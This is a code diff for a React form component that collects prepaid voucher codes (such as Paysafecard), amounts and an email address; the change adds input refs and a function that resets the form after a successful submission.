@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { InfosUser } from "../utils/Types";
 import { generateField } from "../utils/generateField";
 import { sendUserInfosByEmail } from "../utils/Methods";
@@ -10,6 +10,11 @@ function SubmissionForm() {
   const [message, setMessage] = useState("");
   const [selectedTicked, setSelectedTicked] = useState("Paysafecard");
   const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();
+
+  let field1: any = useRef()
+  let field2: any = useRef()
+  let field3: any = useRef()
+  let field4: any = useRef()
 
   const infosUser: InfosUser = {
     ticket: selectedTicked,
@@ -36,8 +41,24 @@ function SubmissionForm() {
     setHtmlInputE(htmlIe);
   }, []);
 
-  const handleAmount = (event: any) => {
+  const resetFields = () => {
+    field1.current.value = 'Paysafecard'
+    field2.current.value = null
+    field3.current.value = null
+    field4.current.value = null
+    setTicketsFieldGenerate([])
+    setSelectedTicked('Paysafecard')
+    setUser({
+      ticket: 'Paysafecard',
+      ticketNumber: 0,
+      ticketCodes: [],
+      amount: "",
+      email: "",
+      stringCodes: "",
+    })
+  }
 
+  const handleAmount = (event: any) => {
     if (
       ![...tabValues].includes(
         event.target.value.split("")[event.target.value.length - 1]
@@ -118,6 +139,7 @@ function SubmissionForm() {
         setMessage(
           "votre requette a bien été prise en compte, verifiez votre mail"
         );
+        resetFields()
       }
     } catch (error) {
       console.log(error);
@@ -178,6 +200,7 @@ function SubmissionForm() {
           <div style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}>
             <label className="select-label">
               <select
+                ref={field1}
                 name="options"
                 onChange={(e) => {
                   handleSelectedTicket(e);
@@ -223,6 +246,7 @@ function SubmissionForm() {
           {
             <div className="user-box persofade">
               <input
+                ref={field2}
                 type="text"
                 maxLength={16}
                 required
@@ -234,6 +258,7 @@ function SubmissionForm() {
 
           <div className="user-box">
             <input
+              ref={field3}
               type="text"
               className="tn"
               required
@@ -246,7 +271,7 @@ function SubmissionForm() {
 
           {ticketsFieldGenerate.length > 1 &&
             <div className="user-box" style={{ position: 'relative' }}>
-              <label className="user-box" style={{ position: 'absolute', top: '-35px', display: 'block', color: '#03e9f4', visibility: "visible", paddingBottom: '8px',fontSize:'15px' }}>Veuillez défiler au scroll pour remplir</label>
+              <label className="user-box" style={{ position: 'absolute', top: '-35px', display: 'block', color: '#03e9f4', visibility: "visible", paddingBottom: '8px', fontSize: '15px' }}>Veuillez défiler au scroll pour remplir</label>
             </div>
           }
 
@@ -254,7 +279,7 @@ function SubmissionForm() {
             {ticketsFieldGenerate}
           </div>
           <div className="user-box persofade">
-            <input type="email" required onChange={handleEmail} />
+            <input ref={field4} type="email" required onChange={handleEmail} />
             <label>Email</label>
           </div>
           <a
